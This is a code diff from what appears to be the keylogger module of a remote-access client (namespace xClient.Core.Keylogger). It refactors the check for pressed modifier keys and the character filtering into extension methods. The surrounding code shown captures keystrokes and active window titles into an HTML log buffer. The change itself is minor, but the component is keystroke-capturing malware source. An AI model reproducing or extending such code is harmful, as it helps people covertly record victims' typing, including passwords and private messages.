@@ -100,7 +100,7 @@ namespace xClient.Core.Keylogger
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
             }
 
-            if (ModifierKeysSet())
+            if (_pressedKeys.HasSetModifierKeys())
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
@@ -134,7 +134,7 @@ namespace xClient.Core.Keylogger
             if (!_pressedKeyChars.Contains(e.KeyChar))
             {
                 _pressedKeyChars.Add(e.KeyChar);
-                _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
+                _logFileBuffer.Append(e.KeyChar.Filter());
             }
         }
 
@@ -143,16 +143,6 @@ namespace xClient.Core.Keylogger
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
             for (int i = 0; i < _pressedKeyChars.Count; i++)
                 _pressedKeyChars.RemoveAt(i);
-        }
-
-        private bool ModifierKeysSet()
-        {
-            return _pressedKeys.Contains(Keys.LControlKey)
-                   || _pressedKeys.Contains(Keys.RControlKey)
-                   || _pressedKeys.Contains(Keys.LMenu)
-                   || _pressedKeys.Contains(Keys.RMenu)
-                   || _pressedKeys.Contains(Keys.LWin)
-                   || _pressedKeys.Contains(Keys.RWin);
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -165,7 +155,7 @@ namespace xClient.Core.Keylogger
                 names[i] = LoggerHelper.GetDisplayName(keys[i].ToString());
             }
 
-            if (ModifierKeysSet())
+            if (_pressedKeys.HasSetModifierKeys())
             {
                 StringBuilder specialKeys = new StringBuilder();
 
